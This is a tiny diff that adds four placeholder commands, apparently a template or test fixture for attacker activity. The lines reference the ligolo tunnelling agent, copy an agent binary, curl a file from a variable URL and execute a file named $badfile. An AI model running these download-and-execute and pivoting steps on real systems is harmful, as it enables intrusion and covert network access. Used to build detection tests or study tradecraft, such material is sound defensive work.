@@ -1,0 +1,4 @@
+ligolo agent.exe
+cp agent.bin $toolfile
+curl -O $downloadurl
+.\$badfile
